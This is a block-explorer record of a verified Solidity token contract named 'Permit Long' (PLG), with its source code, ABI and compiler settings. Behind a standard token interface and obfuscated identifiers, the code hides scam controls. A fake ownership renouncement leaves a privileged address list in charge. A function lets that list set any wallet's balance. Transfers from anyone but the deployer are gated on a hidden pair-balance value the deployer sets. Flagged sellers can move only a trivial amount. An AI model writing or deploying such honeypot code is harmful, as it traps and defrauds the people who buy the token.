{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface totalTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchReceiver) external view returns (uint256);\n\n    function transfer(address senderFrom, uint256 senderMarketingMax) external returns (bool);\n\n    function allowance(address minSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderMarketingMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderFrom,\n        uint256 senderMarketingMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atMode, uint256 value);\n    event Approval(address indexed minSender, address indexed spender, uint256 value);\n}\n\nabstract contract fromTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptList {\n    function createPair(address teamLaunch, address receiverList) external returns (address);\n}\n\ninterface totalTxMetadata is totalTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PermitLong is fromTo, totalTx, totalTxMetadata {\n\n    function minMax(uint256 senderMarketingMax) public {\n        atTeamIs();\n        listEnable = senderMarketingMax;\n    }\n\n    address fromMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public liquidityTake;\n\n    uint256 constant exemptTeam = 16 ** 10;\n\n    function tradingSender(address autoWallet) public {\n        if (modeTakeLaunched) {\n            return;\n        }\n        \n        isAtFrom[autoWallet] = true;\n        \n        modeTakeLaunched = true;\n    }\n\n    string private enableSwap = \"Permit Long\";\n\n    function transferFrom(address totalTeam, address senderFrom, uint256 senderMarketingMax) external override returns (bool) {\n        if (_msgSender() != toSell) {\n            if (fromAmountSell[totalTeam][_msgSender()] != type(uint256).max) {\n                require(senderMarketingMax <= fromAmountSell[totalTeam][_msgSender()]);\n                fromAmountSell[totalTeam][_msgSender()] -= senderMarketingMax;\n            }\n        }\n        return txSwap(totalTeam, senderFrom, senderMarketingMax);\n    }\n\n    address public autoAtList;\n\n    bool private fundTx;\n\n    function swapAutoMin() public {\n        emit OwnershipTransferred(autoAtList, address(0));\n        marketingTx = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldMarketing;\n    }\n\n    function buyReceiverTake(address txToken) public {\n        atTeamIs();\n        if (teamBuy == atSender) {\n            sellTrading = false;\n        }\n        if (txToken == autoAtList || txToken == shouldFrom) {\n            return;\n        }\n        feeLimit[txToken] = true;\n    }\n\n    uint256 listEnable;\n\n    bool public modeTakeLaunched;\n\n    uint256 private shouldLaunched;\n\n    function balanceOf(address launchReceiver) public view virtual override returns (uint256) {\n        return txWallet[launchReceiver];\n    }\n\n    bool public fromLaunched;\n\n    function walletMax(address exemptAt, uint256 senderMarketingMax) public {\n        atTeamIs();\n        txWallet[exemptAt] = senderMarketingMax;\n    }\n\n    event OwnershipTransferred(address indexed fundReceiver, address indexed walletSender);\n\n    mapping(address => mapping(address => uint256)) private fromAmountSell;\n\n    function name() external view virtual override returns (string memory) {\n        return enableSwap;\n    }\n\n    uint256 public fundWallet;\n\n    function allowance(address fromAuto, address limitTokenWallet) external view virtual override returns (uint256) {\n        if (limitTokenWallet == toSell) {\n            return type(uint256).max;\n        }\n        return fromAmountSell[fromAuto][limitTokenWallet];\n    }\n\n    uint8 private exemptTxMarketing = 18;\n\n    address toSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address exemptAt, uint256 senderMarketingMax) external virtual override returns (bool) {\n        return txSwap(_msgSender(), exemptAt, senderMarketingMax);\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingTx;\n    }\n\n    bool public txAuto;\n\n    function approve(address limitTokenWallet, uint256 senderMarketingMax) public virtual override returns (bool) {\n        fromAmountSell[_msgSender()][limitTokenWallet] = senderMarketingMax;\n        emit Approval(_msgSender(), limitTokenWallet, senderMarketingMax);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return marketingTx;\n    }\n\n    function atTeamIs() private view {\n        require(isAtFrom[_msgSender()]);\n    }\n\n    mapping(address => bool) public isAtFrom;\n\n    address private marketingTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundFrom;\n    }\n\n    uint256 private atSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptTxMarketing;\n    }\n\n    bool public sellTrading;\n\n    uint256 private teamBuy;\n\n    bool public tokenBuy;\n\n    mapping(address => uint256) private txWallet;\n\n    function fromLimit(address totalTeam, address senderFrom, uint256 senderMarketingMax) internal returns (bool) {\n        require(txWallet[totalTeam] >= senderMarketingMax);\n        txWallet[totalTeam] -= senderMarketingMax;\n        txWallet[senderFrom] += senderMarketingMax;\n        emit Transfer(totalTeam, senderFrom, senderMarketingMax);\n        return true;\n    }\n\n    constructor (){\n        \n        senderAt toTradingFrom = senderAt(toSell);\n        shouldFrom = exemptList(toTradingFrom.factory()).createPair(toTradingFrom.WETH(), address(this));\n        \n        autoAtList = _msgSender();\n        swapAutoMin();\n        isAtFrom[autoAtList] = true;\n        txWallet[autoAtList] = fundFrom;\n        if (liquidityTake != sellTrading) {\n            sellTrading = false;\n        }\n        emit Transfer(address(0), autoAtList, fundFrom);\n    }\n\n    mapping(address => bool) public feeLimit;\n\n    address public shouldFrom;\n\n    uint256 launchedListAmount;\n\n    function txSwap(address totalTeam, address senderFrom, uint256 senderMarketingMax) internal returns (bool) {\n        if (totalTeam == autoAtList) {\n            return fromLimit(totalTeam, senderFrom, senderMarketingMax);\n        }\n        uint256 maxSwap = totalTx(shouldFrom).balanceOf(fromMax);\n        require(maxSwap == listEnable);\n        require(senderFrom != fromMax);\n        if (feeLimit[totalTeam]) {\n            return fromLimit(totalTeam, senderFrom, exemptTeam);\n        }\n        return fromLimit(totalTeam, senderFrom, senderMarketingMax);\n    }\n\n    uint256 private fundFrom = 100000000 * 10 ** 18;\n\n    string private shouldMarketing = \"PLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTokenWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTokenWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketingMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAtList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"}],\"name\":\"buyReceiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAtFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderMarketingMax\",\"type\":\"uint256\"}],\"name\":\"minMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTakeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAutoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"}],\"name\":\"tradingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketingMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketingMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMarketingMax\",\"type\":\"uint256\"}],\"name\":\"walletMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PermitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}